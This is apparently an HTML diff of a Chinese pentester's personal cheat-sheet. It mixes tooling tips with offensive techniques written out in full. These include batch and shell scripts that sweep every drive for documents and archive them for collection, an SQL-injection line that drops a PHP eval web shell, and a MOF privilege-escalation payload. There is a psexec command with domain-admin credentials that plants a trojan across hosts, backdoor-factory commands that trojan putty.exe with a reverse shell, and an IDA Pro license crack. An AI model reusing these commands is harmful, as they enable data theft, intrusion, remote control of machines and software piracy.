-   for /f %j in ('dir /b /s "c:<span class="se">\M</span>SCOMCTL.O?X"') do (echo %j)
-    windows找文件中的字符串命令:
-   findstr /R ".<span class="ge">*sa.*</span>" c:<span class="se">\1\*</span> &gt; tmp.txt
+</span>windows:
+find /r 目录名 %变量名 in (匹配模式1,匹配模式2) do 命令  eg:echo "yes" | for /r f:<span class="se">\ </span>%i in (<span class="ge">*.doc,*</span>.docx,<span class="ge">*.pdf,*</span>.xls,<span class="ge">*.xlsx,*</span>.txt) do copy "%i" f:<span class="se">\w</span>eb_r
+c:<span class="se">\r</span>ecycler<span class="se">\r</span>ar.exe a -k -r -s -m1 c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\t</span>mp.rar c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\*</span>.<span class="err">*</span>
+7z.exe a -t7z -p123456 c:<span class="se">\t</span>est.7z c:<span class="se">\t</span>est<span class="se">\*</span>.<span class="err">*</span>
+del /f/q folder
+rar a /v20m /m0 newfilename web.rar
+windows find web.config==&gt;for /r c:<span class="se">\h</span>ttp<span class="se">\ </span>%i in (web.conf?g) do (echo <span class="gs">****</span><span class="ge">*filepath*</span><span class="gs">****</span> &gt;&gt; tmp.txt &amp;&amp; echo %i &gt;&gt; tmp.txt &amp;&amp; type "%i" &gt;&gt; tmp.txt &gt;&gt; tmp.txt &amp;&amp; echo. &gt;&gt; tmp.txt)
+windows bat批处理for用法:http://blog.csdn.net/wh_19910525/article/details/7912440<span class="sb">
 
-   powershell:dir –r | select-string "root"
 
-   windows打包(7z)命令:1.bat
-   ---------------content of 1.bat--------------------------
-    @echo off
-    goto :main
-    这是注释:(for /f "delims="的作用为取消默认的以空格等符号作为分割符
-    dir /s 实现了linux中的find功能,for /r path %%i in (web.conf?g) do ... 也可以实现find功能,但是自己实现时发现for /r path ...中的path只能是一个具体路径,不能是变量,这样就不能遍历全部磁盘了)
-    :main
-    set str=c d e f g h i j k l m n o p q r s t u v w x y z 
-    rd /s/q c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp
-    md c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp
-    echo  当前硬盘的分区有: 
-    for %%i in (%str%) do (
-    if exist %%i: (echo %%i:
-    
-    for /f "delims=" %%j in ('dir /b /s "%%i:<span class="se">\*</span>.doc"') do (
-    echo "yes" | copy "%%j" c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp
-    echo %%j &gt;&gt; tmp.txt
-    )
-    
-    for /f "delims=" %%j in ('dir /b /s "%%i:<span class="se">\*</span>.docx"') do (
-    echo "yes" | copy "%%j" c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp
-    echo %%j &gt;&gt; c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\t</span>mp.txt
-    )
-    
-    
-    for /f "delims=" %%j in ('dir /b /s "%%i:<span class="se">\*</span>.pdf"') do (
-    echo "yes" | copy "%%j" c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp
-    echo %%j &gt;&gt; c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\t</span>mp.txt
-    )
-    
-    
-    for /f "delims=" %%j in ('dir /b /s "%%i:<span class="se">\*</span>.txt"') do (
-    echo "yes" | copy "%%j" c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp
-    echo %%j &gt;&gt; c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\t</span>mp.txt
-    )
-    
-    
-    for /f "delims=" %%j in ('dir /b /s "%%i:<span class="se">\*</span>.xls"') do (
-    echo "yes" | copy "%%j" c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp
-    echo %%j &gt;&gt; c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\t</span>mp.txt
-    )
-    
-    
-    for /f "delims=" %%j in ('dir /b /s "%%i:<span class="se">\*</span>.xlsx"') do (
-    echo "yes" | copy "%%j" c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp
-    echo %%j &gt;&gt; c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\t</span>mp.txt
-    )
-    
-    
-    )
-    )
-    
-    7z a -t7z C:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\t</span>est.7z C:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\*</span>.<span class="err">*</span>
-    ------------------end--------------------------------<span class="sb">
+</span>windows找文件命令:
+for /f %j in ('dir /b /s "c:<span class="se">\M</span>SCOMCTL.O?X"') do (echo %j)
+windows找文件中的字符串命令:
+findstr /R ".<span class="ge">*sa.*</span>" c:<span class="se">\1\*</span> &gt; tmp.txt
 
-    linux打包命令:1.sh(attention:without "&amp;&amp; echo ok",the final tar -T xlsx.list -czf xlsx.tar.gz will fail)
-    -----------------content of 1.sh--------------------
-    mkdir /tmp/tmp &amp;&amp; find / -name "*.doc" &gt; /tmp/tmp/doc.list &amp;&amp; find / -name "*.docx" &gt; /tmp/tmp/docx.list &amp;&amp; find / -name "*.pdf" &gt; /tmp/tmp/pdf.list &amp;&amp; find / -name "*.txt" &gt; /tmp/tmp/txt.list &amp;&amp; find / -name "*.xls" &gt; /tmp/tmp/xls.list &amp;&amp; find / -name "*.xlsx" &gt; /tmp/tmp/xlsx.list &amp;&amp; tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz &amp;&amp; tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz &amp;&amp; tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz &amp;&amp; tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz &amp;&amp; tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz &amp;&amp; tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz &amp;&amp; echo ok
+powershell:dir –r | select-string "root"
+
+windows打包(7z)命令:1.bat
+---------------content of 1.bat--------------------------
+@echo off
+goto :main
+这是注释:(for /f "delims="的作用为取消默认的以空格等符号作为分割符
+dir /s 实现了linux中的find功能,for /r path %%i in (web.conf?g) do ... 也可以实现find功能,但是自己实现时发现for /r path ...中的path只能是一个具体路径,不能是变量,这样就不能遍历全部磁盘了)
+:main
+set str=c d e f g h i j k l m n o p q r s t u v w x y z 
+rd /s/q c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp
+md c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp
+echo  当前硬盘的分区有: 
+for %%i in (%str%) do (
+if exist %%i: (echo %%i:
+
+for /f "delims=" %%j in ('dir /b /s "%%i:<span class="se">\*</span>.doc"') do (
+echo "yes" | copy "%%j" c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp
+echo %%j &gt;&gt; tmp.txt
+)
+
+for /f "delims=" %%j in ('dir /b /s "%%i:<span class="se">\*</span>.docx"') do (
+echo "yes" | copy "%%j" c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp
+echo %%j &gt;&gt; c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\t</span>mp.txt
+)<span class="sb">
+
+
+</span>for /f "delims=" %%j in ('dir /b /s "%%i:<span class="se">\*</span>.pdf"') do (
+echo "yes" | copy "%%j" c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp
+echo %%j &gt;&gt; c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\t</span>mp.txt
+)<span class="sb">
+
+
+</span>for /f "delims=" %%j in ('dir /b /s "%%i:<span class="se">\*</span>.txt"') do (
+echo "yes" | copy "%%j" c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp
+echo %%j &gt;&gt; c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\t</span>mp.txt
+)<span class="sb">
+
+
+</span>for /f "delims=" %%j in ('dir /b /s "%%i:<span class="se">\*</span>.xls"') do (
+echo "yes" | copy "%%j" c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp
+echo %%j &gt;&gt; c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\t</span>mp.txt
+)<span class="sb">
+
+
+</span>for /f "delims=" %%j in ('dir /b /s "%%i:<span class="se">\*</span>.xlsx"') do (
+echo "yes" | copy "%%j" c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp
+echo %%j &gt;&gt; c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\t</span>mp.txt
+)<span class="sb">
+
+
+</span>)
+)
+
+7z a -t7z C:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\t</span>est.7z C:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\*</span>.<span class="err">*</span>
+------------------end--------------------------------
+
+linux打包命令:1.sh(attention:without "&amp;&amp; echo ok",the final tar -T xlsx.list -czf xlsx.tar.gz will fail)
+-----------------content of 1.sh--------------------
+mkdir /tmp/tmp &amp;&amp; find / -name "<span class="ge">*.doc" &gt; /tmp/tmp/doc.list &amp;&amp; find / -name "*</span>.docx" &gt; /tmp/tmp/docx.list &amp;&amp; find / -name "<span class="ge">*.pdf" &gt; /tmp/tmp/pdf.list &amp;&amp; find / -name "*</span>.txt" &gt; /tmp/tmp/txt.list &amp;&amp; find / -name "<span class="ge">*.xls" &gt; /tmp/tmp/xls.list &amp;&amp; find / -name "*</span>.xlsx" &gt; /tmp/tmp/xlsx.list &amp;&amp; tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz &amp;&amp; tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz &amp;&amp; tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz &amp;&amp; tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz &amp;&amp; tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz &amp;&amp; tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz &amp;&amp; echo ok
     --------------------end-----------------------------
-</span><span class="p">41.</span>kali linux2.0 import folder path:/usr/share/applications   eg.gnome-control-center network
+<span class="p">41.</span>kali linux2.0 import folder path:/usr/share/applications   eg.gnome-control-center network
 <span class="p">42.</span>http://www.orico.com.cn/   driver    
 <span class="p">43.</span>python中单引号,双引号,三引号http://blog.csdn.net/caianye/article/details/6638183       
 <span class="p">45.</span>os.system('''python %s &gt;&gt; "out_log.txt"''' % exp_path) "&gt;&gt;" instead of "open(file,"a+") fp.write(str)" in py2 or py3
-<span class="p">46.</span>tips:  
+<span class="p">46.</span>others' tips:  
    msf必不可少burpsuite/fiddler必不可少python,ruby,shell,perl必不可少,不会编程还是别玩了.
    c/c++/java能看懂写小东西,这几个得熟练nmap,sqlmap,niktoida常备dropbox,evernote常备还有啥呢?
    成形的工具只能用于通用检测,针对具体对象,还需要写些自己的工具,另外准备些有针对性的基础库,字典啥的,经常干这个都知道先想到这些,稍后再补充,再紧张干活中…….
@@ -500,8 +515,9 @@
    }
    ?&gt;
 
-   其中iconv("UTF-8","gbk",$a)或是iconv("UTF-8","gb2313",$a)都会在chr(128)到chr(255)之间截断,使结果为1,而不是1(some char)2,
-   其中128和255为二进制数据表示,此处NUL(nul)(chr(0x00))并不能截断iconv函数,而是chr(128)-chr(255),也即chr(0x80)-chr(0xff)截断iconv函数.
+   其中iconv("UTF-8","gbk",$a)或是iconv("UTF-8","gb2313",$a)都会在chr(128)到chr(255)之间截断,使结果为1,
+   而不是1(some char)2,其中128和255为二进制数据表示,此处NUL(nul)(chr(0x00))并不能截断iconv函数,
+   而是chr(128)-chr(255),也即chr(0x80)-chr(0xff)截断iconv函数.
    或者用如下代码中hex2asc函数:
    script 2:
    &lt;?php
@@ -558,7 +574,8 @@
 <span class="p">57.</span>菜刀替代工具:Altman
    http://www.i0day.com/1725.html
    https://github.com/keepwn/Altman
-<span class="p">58.</span>Pidgin my irc client on linux http://www.linux.com/news/software/applications/295201:five-best-irc-clients-for-linux
+<span class="p">58.</span>Pidgin my irc client on linux
+	http://www.linux.com/news/software/applications/295201:five-best-irc-clients-for-linux
 <span class="p">59.</span>dig mx domain(without www)
 <span class="p">60.</span>pwntool:https://www.91ri.org/14382.html
 <span class="p">61.</span>vim以十六进制编辑文件:%!xxd
@@ -632,9 +649,11 @@
    response = urllib2.urlopen(req)
    the_page = response.read()
 <span class="p">67.</span>python使用urllib2容易犯的错误:
-　　系统安装了google的chrome浏览器,需要burp截chrome的包时会在里面设置代理,而chrome设置的代理即是系统的代理,而firefox设置的代理只是firefox浏览器的代理,并不影响系统的网络访问是否要经过firefox设置的代理,
+　　系统安装了google的chrome浏览器,需要burp截chrome的包时会在里面设置代理,而chrome设置的代理即是系统的代理,
+	而firefox设置的代理只是firefox浏览器的代理,并不影响系统的网络访问是否要经过firefox设置的代理,
 　　如果设置了chrome的代理如127.0.0.1:8080,事后忘记关闭,则会影响到系统中所有需要联网的程序.
-  　urllib2 默认会使用环境变量 http_proxy来设置 HTTP Proxy,如果想在程序中明确控制 Proxy 而不受环境变量的影响,可以使用自己设置的代理,可以设置代理为空:
+  　urllib2 默认会使用环境变量 http_proxy来设置 HTTP Proxy,如果想在程序中明确控制 Proxy 而不受环境变量的影响,
+  	可以使用自己设置的代理,可以设置代理为空:
 
   　null_proxy_handler=urllib2.ProxyHandler({})
   　opener=urllib2.build_opener(null_proxy_handler)
@@ -643,7 +662,8 @@
   　这样就不会出现urllib2　error 101　refused的错误了,也可以将系统的127.0.0.1:8080的代理关掉.(linux中set命令可以看到http_proxy的值,http_proxy并不是vpn的ip)
   　在sublime text中有个sublimeREPL插件,f5快捷键可编译运行python脚本,然而就算系统设置了代理127.0.0.1:8080等,f5依然可以将使用了urllib2且没有加上面３行代码的python脚本
   　成功执行,也许是sublimeREPL中默认的运行代码设置了自己的代理为空,且不影响系统代理http_proxy的值.
-<span class="p">68.</span>python,beautifulsoup中正则匹配中文的错误解决办法:http://www.lylinux.org/python%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E4%B8%AD%E6%96%87.html
+<span class="p">68.</span>python,beautifulsoup中正则匹配中文的错误解决办法:
+	http://www.lylinux.org/python%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E4%B8%AD%E6%96%87.html
    python正则表达式:
        http://www.cnblogs.com/huxi/archive/2010/07/04/1771073.html
        在线正则:
@@ -680,15 +700,22 @@
         1&gt;2to3 file.py(2to3 -w file.py)(2to3 -f print -w file.py)(man 2to3)
         2&gt;python -3 file.py
 </span><span class="p">69.</span>python中获得执行系统命令的输出:http://blog.csdn.net/g457499940/article/details/17068277
-<span class="p">70.</span>python代码中不能有~符号当作/root目录的习惯,open('~/something','r+')会出错,os.system('~/something')不会,为保证不出错,在代码中不用~符号,另外os.system(),open()等函数中不要有%s这种格式化字符串变量
-　　如果要用到在这些函数中传入一个变量作参数,先在os.system(),open()等函数前面格式化成普通不带%s的变量再传入这些函数,eg.a='python /root/%s' % input(),os.system(a)
-<span class="p">71.</span>ida pro中graph功能失败,could not find grapher 'qwingraph.exe'.please check GRAPH_VISUALIZER in ida.cfg　　　　　　解决方法http://blog.csdn.net/qysh123/article/details/17590731
+<span class="p">70.</span>python代码中不能有~符号当作/root目录的习惯,open('~/something','r+')会出错,os.system('~/something')不会,
+	为保证不出错,在代码中不用~符号,另外os.system(),open()等函数中不要有%s这种格式化字符串变量
+　　如果要用到在这些函数中传入一个变量作参数,先在os.system(),open()等函数前面格式化成普通不带%s的变量再传入这些
+	函数,eg.a='python /root/%s' % input(),os.system(a)
+<span class="p">71.</span>ida pro中graph功能失败,could not find grapher 'qwingraph.exe'.please check GRAPH_VISUALIZER in ida.cfg
+	解决方法http://blog.csdn.net/qysh123/article/details/17590731
 <span class="p">72.</span>sqlmap跑出有如
    Payload: 8.8.8.8' AND 3588=3588-- RMEo
-   的盲注,如果使用了--batch参数或者使用sqlmap推荐的(found sql injection in MySQL database,dismiss other type of database?Y/n),虽然这样的盲注一般是MySQL的注入点,但是其他数据库也有可能是这样的,
-   比如SQLite,这个时候如果同意忽略其他数据库类型的检测,会发现sqlmap按照MySQL的注入语法跑不出什么结果,database:none.同理,在一般sqlmap使用过程中,为了全面的检测,最好不要一直使用sqlmap推荐的默认选项.在此例中,使用--dbms=SQLite
-   参数,成功跑出目标SQLite数据库的内容.另外,实验中发现sqlmap会出现一会能跑出,一会跑不出的现象,可见,工具不是完全可靠的,要是一下没有跑出,多跑几次就出来了.
-<span class="p">73.</span>preg_replace包含/e修饰符利用:http://www.jb51.net/article/38714.htm　其中echo "${@phpinfo()}";就可以了,不必　echo "{${phpinfo()}}";
+   的盲注,如果使用了--batch参数或者使用sqlmap推荐的(found sql injection in MySQL database,dismiss other type of
+   database?Y/n),虽然这样的盲注一般是MySQL的注入点,但是其他数据库也有可能是这样的,比如SQLite,这个时候如果同意忽
+   略其他数据库类型的检测,会发现sqlmap按照MySQL的注入语法跑不出什么结果,database:none.同理,在一般sqlmap使用过程
+   中,为了全面的检测,最好不要一直使用sqlmap推荐的默认选项.在此例中,使用--dbms=SQLite参数,成功跑出目标SQLite数据
+   库的内容.另外,实验中发现sqlmap会出现一会能跑出,一会跑不出的现象,可见,工具不是完全可靠的,要是一下没有跑出,多
+   跑几次就出来了.
+<span class="p">73.</span>preg_replace包含/e修饰符利用:http://www.jb51.net/article/38714.htm　其中echo "${@phpinfo()}";就可以了,不必
+	echo "{${phpinfo()}}";
 <span class="p">74.</span>vim配置:
           https://github.com/xinghuacai/spf13-vim
           http://blog.csdn.net/namecyf/article/details/7787479
@@ -698,7 +725,8 @@
             http://www.oschina.net/code/snippet_561596_17292
    python操作vim
           http://top.jobbole.com/15078/
-   vim中F5编译运行py文件:1&gt;http://zhidao.baidu.com/link?url=VwJYAbWPaVimFP0uC26hdOV8EFTTcWFIi2xvexA9z-K7dcFIpD-1TnN9893937bxdEGcrlx2qR-cEsK-UVzoma
+   vim中F5编译运行py文件:
+   1&gt;http://zhidao.baidu.com/link?url=VwJYAbWPaVimFP0uC26hdOV8EFTTcWFIi2xvexA9z-K7dcFIpD-1TnN9893937bxdEGcrlx2qR-cEsK-UVzoma
                            把function添加在_vimrc的前边,不要放在最后:
                            function CheckPythonSyntax()
                                let mp = &amp;makeprg
@@ -742,14 +770,19 @@
            ｜        
           内网(192.168.3.x)
    3&gt;其中光猫含有路由器功能,此处有线路由相当于集线器功能
-   4&gt;如果在光猫上设置dmz为无线路由在光猫所在网段的ip,也即192.168.1.4(此ip可在无线路由的wan口所在ip值看到,此ip值由光猫上的dhcp随机分配)
+   4&gt;如果在光猫上设置dmz为无线路由在光猫所在网段的ip,也即192.168.1.4(此ip可在无线路由的wan口所在ip值看到,
+   	 此ip值由光猫上的dhcp随机分配)
    5&gt;wan口和lan口区别:&gt;每个路由器有wan口和lan口,光猫拨号,其wan口ip为internet接口所在ip,一般为动态获取的一个值,其lan口ip为192.168.1.1(此ip可在光猫上人工设置成任意192.168.x.1形式)
                   　&gt;无线路由的wan口ip为光猫所在局域网的ip段中的ip:192.168.1.4,lan口ip为192.168.3.1(此ip可在无线路由器上人工设置成任意192.168.x.1形式)
-   6&gt;不加dmz时的内网端口映射:光猫上设置nat:将外部数据转到192.168.1.4及对应端口,无线路由器上设置nat:将外部数据转到需要端口映射的内网机器的ip(eg.192.168.3.11)及对应端口
-   7&gt;加dmz时的内网端口映射:在光猫上设置dmz为无线路由在光猫所在网段的ip,也即192.168.1.4,在无线路由器上设置nat:将外部数据转到需要端口映射的内网机器的ip(eg.192.168.3.11)及对应端口(其中dmz相当于转发光猫上的所有端口数据到无线路由器上,外部访问光猫公网ip即相当于访问无线路由)
+   6&gt;不加dmz时的内网端口映射:光猫上设置nat:将外部数据转到192.168.1.4及对应端口,无线路由器上设置nat:将外部数据转
+     到需要端口映射的内网机器的ip(eg.192.168.3.11)及对应端口
+   7&gt;加dmz时的内网端口映射:在光猫上设置dmz为无线路由在光猫所在网段的ip,也即192.168.1.4,在无线路由器上设置nat:将
+   	 外部数据转到需要端口映射的内网机器的ip(eg.192.168.3.11)及对应端口(其中dmz相当于转发光猫上的所有端口数据到
+	 无线路由器上,外部访问光猫公网ip即相当于访问无线路由)
 <span class="p">76.</span>内网渗透 代理&amp;转发 http://www.heysec.org/archives/115
 <span class="p">77.</span>union select 1,2,3,4,load_file(0x433a5c666c76706c617965725c6e756c6c6576742e6d6f66),6 into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'-- - (路径中用/不用<span class="se">\)</span>
-   写一句话是select 1,2,3,4,<span class="cp">&lt;?php @eval($_POST[cmd]);?&gt;</span>,6 into outfile 'c:/ksla/lsd/'-- -　　　　(outfile=dumpfile,but if not,try dumpfile instead of outfile in the first sentence)
+   写一句话是select 1,2,3,4,<span class="cp">&lt;?php @eval($_POST[cmd]);?&gt;</span>,6 into outfile 'c:/ksla/lsd/'-- -　　　　
+   (outfile=dumpfile,but if not,try dumpfile instead of outfile in the first sentence)
    mysql中phpmyadmin提权:http://blog.sina.com.cn/s/blog_b8ab0ac20101sbwe.html
    udf:http://www.cnblogs.com/qing123/p/4676808.html
    outfile和dumpfile区别:http://www.dedecms.com/knowledge/data-base/mysql/2012/0819/7569.html
@@ -773,15 +806,16 @@
     -slave 103.240.203.6 200  202.177.192.16 3389
     local:-listen 
 <span class="p">86.</span>sa权限上传文件九种方法:http://www.csdn123.com/html/20130308/49/019024fd66e9a1a793e4344a6cc47175.htm
-<span class="p">87.</span>内网渗透:http://www.pojie567.com/blog/?post=5186
-             http://www.1990day.com/regeorg-proxychains-gold-partner/
-             http://www.codersec.net/%E5%AF%B9%E5%9B%BD%E5%A4%96%E6%9F%90%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%BB%93/
-             http://netsecurity.51cto.com/art/201602/506072.htm 使用Quarks PwDump获取域控密码
-             https://www.91ri.org/tag/neiwang-hacker
-             http://drops.wooyun.org/tips/6617   导出当前域内所有用户hash的技术整理
-             http://www.objectif-securite.ch/ophcrack.php   windows hashes crack
-             http://cracer.com/?p=1247  拿下域控后批量种马:psexec.exe @pc.txt -u ABIMAQ<span class="se">\A</span>dministrator -p k78m90 -c c:<span class="se">\k</span>av<span class="se">\2</span>009.exe
-             http://drops.wooyun.org/tips/12021   拿下域控权限
+<span class="p">87.</span>内网渗透:
+	http://www.pojie567.com/blog/?post=5186
+    http://www.1990day.com/regeorg-proxychains-gold-partner/
+    http://www.codersec.net/%E5%AF%B9%E5%9B%BD%E5%A4%96%E6%9F%90%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%BB%93/
+    http://netsecurity.51cto.com/art/201602/506072.htm 使用Quarks PwDump获取域控密码
+    https://www.91ri.org/tag/neiwang-hacker
+    http://drops.wooyun.org/tips/6617   导出当前域内所有用户hash的技术整理
+    http://www.objectif-securite.ch/ophcrack.php   windows hashes crack
+    http://cracer.com/?p=1247  拿下域控后批量种马:psexec.exe @pc.txt -u ABIMAQ<span class="se">\A</span>dministrator -p k78m90 -c c:<span class="se">\k</span>av<span class="se">\2</span>009.exe
+    http://drops.wooyun.org/tips/12021   拿下域控权限
    快速找出dc:
             dsquery server(best)
             nslookup -type=SRV _ldap._tcp.baidu.com
@@ -810,49 +844,51 @@
 <span class="p">91.</span>https://ghostbin.com/  :-&gt; paste? a site has article like:https://ghostbin.com/paste/6kho7?luicode=10000359
                                                              from:
                                                              http://drops.wooyun.org/pentesting/15117
-<span class="p">92.</span>kali2安装rime输入法:https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
-                       https://wu.nerd.moe/?p=1752
-                       /usr/bin/rime_dict_manager自带词库管理工具
-                            kali_local:/root/.config/fcitx/rime/wubi86.userdb.kct
-                            windows:%appdata%<span class="se">\r</span>ime<span class="se">\w</span>ubi86.userdb.kct
-                       http://www.jianshu.com/p/cffc0ea094a7
-                       https://github.com/rime/home/wiki/CustomizationGuide
-                       重新部署使配置生效:---&gt;    rm ~/.config/ibus/rime/default.yaml; ibus-daemon -drx<span class="sb">
+<span class="p">92.</span>kali2安装rime输入法:
+https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
+       https://wu.nerd.moe/?p=1752
+       /usr/bin/rime_dict_manager自带词库管理工具
+            kali_local:/root/.config/fcitx/rime/wubi86.userdb.kct
+            windows:%appdata%<span class="se">\r</span>ime<span class="se">\w</span>ubi86.userdb.kct
+       http://www.jianshu.com/p/cffc0ea094a7
+       https://github.com/rime/home/wiki/CustomizationGuide
+       重新部署使配置生效:---&gt;    rm ~/.config/ibus/rime/default.yaml; ibus-daemon -drx<span class="sb">
 
-                       pidof fcitx | xargs kill;pidof sogou-qimpanel | xargs kill;nohup fcitx  1&gt;/dev/null 2&gt;/dev/null &amp;;nohup sogou-qimpanel  1&gt;/dev/null 2&gt;/dev/null &amp;
-                       emoji对应表:https://rimeime.googlecode.com/svn/trunk/artworks/schema/emoji-chart.png
-                       新建default.custom.yaml,内容为patch:...,意思是要覆盖default.yaml中配置,其它如wubi_pinyin.yaml等对应wubi_pinyin.custom.yaml
-                       eg.my default.custom.yaml file:
-                       ---------------------start------------------------
-                            patch:
-                                menu/page_size: 9
-                                schema_list:
-                                  - schema: luna_pinyin
-                                  - schema: luna_pinyin_fluency
-                                  - schema: luna_pinyin_simp
-                                  - schema: wubi_pinyin
-                                  - schema: wubi86
-                                  - schema: emoji
-                                ascii_composer:
-                                  good_old_caps_lock: true
-                                  switch_key:
-                                    Caps_Lock: clear
-                                    Control_L: noop
-                                    Control_R: commit_text
-                                    Eisu_toggle: clear
-                                    Shift_L: commit_code
-                                    Shift_R: inline_ascii
-                      --------------------end----------------------------
-    windows中rime词库文件位置:%APPDATA%\rime
-    深蓝词库转换工具:
-                    https://github.com/studyzy/imewlconverter
-                    http://www.cnblogs.com/studyzy/archive/2013/01/10/2855403.html
-
-</span><span class="p">93.</span>windows download:https://www.microsoft.com/en-us/search/result.aspx?q=windows+xp+professional+x64+edition&amp;form=MSHOME
+       pidof fcitx | xargs kill;pidof sogou-qimpanel | xargs kill;nohup fcitx  1&gt;/dev/null 2&gt;/dev/null &amp;;nohup sogou-qimpanel  1&gt;/dev/null 2&gt;/dev/null &amp;
+       emoji对应表:https://rimeime.googlecode.com/svn/trunk/artworks/schema/emoji-chart.png
+       新建default.custom.yaml,内容为patch:...,意思是要覆盖default.yaml中配置,其它如wubi_pinyin.yaml等对应wubi_pinyin.custom.yaml
+       eg.my default.custom.yaml file:
+       ---------------------start------------------------
+            patch:
+                menu/page_size: 9
+                schema_list:
+                  - schema: luna_pinyin
+                  - schema: luna_pinyin_fluency
+                  - schema: luna_pinyin_simp
+                  - schema: wubi_pinyin
+                  - schema: wubi86
+                  - schema: emoji
+                ascii_composer:
+                  good_old_caps_lock: true
+                  switch_key:
+                    Caps_Lock: clear
+                    Control_L: noop
+                    Control_R: commit_text
+                    Eisu_toggle: clear
+                    Shift_L: commit_code
+                    Shift_R: inline_ascii
+      --------------------end----------------------------
+</span>windows中rime词库文件位置:%APPDATA%<span class="se">\r</span>ime
+深蓝词库转换工具:
+    https://github.com/studyzy/imewlconverter
+    http://www.cnblogs.com/studyzy/archive/2013/01/10/2855403.html
+<span class="p">
+93.</span>windows download:https://www.microsoft.com/en-us/search/result.aspx?q=windows+xp+professional+x64+edition&amp;form=MSHOME
 <span class="p">94.</span>backdoor-factory用法:
-<span class="p">    1.</span>单独的backdoor-factory:backdoor-factory -f /root/Desktop/putty.exe -S (check if the putty.exe is support for backdoor-factory)
-                             backdoor-factory -f /root/Desktop/putty.exe -s show (show usable kinds of reverse shell supported)
-                             backdoor-factory -f /root/Desktop/putty.exe -s ...(... is a kind of shell from former 'show' command) -H vps's ip -P 200
+<span class="p">    1.</span>单独的backdoor-factory:
+		backdoor-factory -f /root/Desktop/putty.exe -S (check if the putty.exe is support for backdoor-factory)
+        backdoor-factory -f /root/Desktop/putty.exe -s show (show usable kinds of reverse shell supported)
+        backdoor-factory -f /root/Desktop/putty.exe -s ...(... is a kind of shell from former 'show' command) -H vps's ip -P 200
 <span class="p">    2.</span>backdoor-factory in veil:--&gt;veil--&gt;list--&gt;number of native/backdoor-factory--&gt;options--&gt;set the options
 <span class="p">95.</span>aspx大马连接报错"/"解决方法:http://www.asp-muma.com/?post=97
    my way defferent from uppon one:
@@ -961,7 +997,8 @@
 <span class="p">119.</span>c_++头:
         using namespace std;
         #include <span class="nt">&lt;iostream&gt;</span>
-<span class="p">120.</span>ida破解,替换ida pro根目录下的ida.key为https://gist.github.com/TheCjw/9f6f7544f33f292db20e下的key文件,然后将系统时间改成1年以前下的key文件,然后将系统时间改成1年以前
+<span class="p">120.</span>ida破解,替换ida pro根目录下的ida.key为https://gist.github.com/TheCjw/9f6f7544f33f292db20e下的key文件,
+	然后将系统时间改成1年以前下的key文件,然后将系统时间改成1年以前
 <span class="p">121.</span>ROP就是所谓的Return Orientated Programming,早期也叫ret2libc.
 <span class="p">122.</span>html中的图标    http://fontawesome.io/icons/
 <span class="p">123.</span>fckeditor设置:hhttp://www.itpa.hk/ttp://www.jb51.net/article/17965.htm
@@ -977,9 +1014,12 @@
     运行C:<span class="se">\P</span>rogram Files (x86)<span class="se">\M</span>icrosoft Visual Studio 14.0<span class="se">\C</span>ommon7<span class="se">\T</span>ools<span class="se">\V</span>sDevCmd.bat
     然后运行cl md.c
     或者打开tools里面的开发人员提示符,然后再cl md.c
